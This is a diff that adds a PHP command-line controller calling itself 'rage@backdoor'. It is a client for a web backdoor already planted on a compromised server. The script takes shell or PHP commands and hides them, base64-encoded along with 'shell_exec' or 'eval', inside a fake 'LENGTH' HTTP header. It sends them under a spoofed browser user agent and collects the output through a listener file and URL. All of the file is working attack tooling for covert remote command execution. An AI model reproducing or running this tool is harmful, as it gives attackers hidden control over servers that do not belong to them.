@@ -1,0 +1,142 @@
+#!/usr/bin/php
+<?php
+$command_history_Array = array();
+
+define("PWNEDURL", "http://127.0.0.1/php/");
+define("LISTENER_FILE", "/var/www/php/response.txt");
+define("LISTENER_URL", "http://127.0.0.1/php/listener.php");
+
+echo "                                                 
+                                                 
+`7MM\"\"\"Mq.        db       .g8\"\"\"bgd `7MM\"\"\"YMM  
+  MM   `MM.      ;MM:    .dP'     `M   MM    `7  
+  MM   ,M9      ,V^MM.   dM'       `   MM   d    
+  MMmmdM9      ,M  `MM   MM            MMmmMM    
+  MM  YM.      AbmmmqMA  MM.    `7MMF' MM   Y  , 
+  MM   `Mb.   A'     VML `Mb.     MM   MM     ,M 
+.JMML. .JMM..AMA.   .AMMA. `\"bmmmdPY .JMMmmmmMMM 
+                                                 
+To execute PHP commands: phpexec date();
+
+";
+
+$done = false;
+while(!$done) {
+    echo "rage@backdoor> ";
+    $handle = fopen("php://stdin","r");
+    $command = fgets($handle);
+    $command = trim($command);
+
+    if($command == "exit") {
+       $done = true; 
+    } else {
+        if($command == "!!") {
+            $command = end($command_history_Array); 
+        }
+
+        if($command != ''){
+            if( contains( $command, "phpexec" ) ) {
+                $command = str_replace( "phpexec ", "", $command );
+                echo send( $command );
+            } else {
+                echo send( $command );
+            }
+        }
+    }
+}
+
+function send($command, $isphp = False) {
+    $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ=";
+    if($isphp) {
+        $headersArray = array("LENGTH: ".get_random_string($charset, 2).base64_encode("eval"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
+    } else {
+        $headersArray = array("LENGTH: ".get_random_string($charset, 2).base64_encode("shell_exec"."\x15".$command." 2>&1"."\x15".LISTENER_URL."/?r="), 'Expect:' );
+    }
+    $curl = curl_init();
+    curl_setopt_array($curl, array(
+        CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_URL => PWNEDURL,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
+        CURLOPT_HTTPHEADER => $headersArray,
+        CURLOPT_HEADER => true
+    ));
+    $resp = curl_exec($curl);
+    $headers = get_headers_from_curl_response($resp);
+    curl_close($curl);
+
+    echo "Waiting for response from server...\n";
+    $response = "NULLCONTENT";
+    while( $response == "NULLCONTENT" ) {
+        $response = file_get_contents( LISTENER_FILE );
+        sleep(1);
+    }
+    file_put_contents( LISTENER_FILE, "NULLCONTENT" );
+    log_command($command, $response);
+    return $response;
+}
+
+
+function log_command($command, $response) {
+    global $command_history_Array;
+  
+    array_push($command_history_Array, $command);
+    file_put_contents("logs.txt", "rage@backdoor> ".$command.$response, FILE_APPEND); 
+}
+
+function get_random_string($valid_chars, $length)
+{
+    // start with an empty random string
+    $random_string = "";
+
+    // count the number of chars in the valid chars string so we know how many choices we have
+    $num_valid_chars = strlen($valid_chars);
+
+    // repeat the steps until we've created a string of the right length
+    for ($i = 0; $i < $length; $i++)
+    {
+        // pick a random number from 1 up to the number of valid chars
+        $random_pick = mt_rand(1, $num_valid_chars);
+
+        // take the random character out of the string of valid chars
+        // subtract 1 from $random_pick because strings are indexed starting at 0, and we started picking at 1
+        $random_char = $valid_chars[$random_pick-1];
+
+        // add the randomly-chosen char onto the end of our string so far
+        $random_string .= $random_char;
+    }
+
+    // return our finished random string
+    return $random_string;
+}
+
+
+function get_headers_from_curl_response($response)
+{
+    $headers = array();
+
+    $header_text = substr($response, 0, strpos($response, "\r\n\r\n"));
+
+    foreach (explode("\r\n", $header_text) as $i => $line)
+        if ($i === 0)
+            $headers['http_code'] = $line;
+        else
+        {
+            list ($key, $value) = explode(': ', $line);
+
+            $headers[$key] = $value;
+        }
+
+    return $headers;
+}
+
+function contains($haystack, $needle)
+{
+        if(strpos($haystack, $needle) !== false) 
+        {
+            return TRUE;
+        } else {
+                return FALSE;
+        }
+}
+
+?>
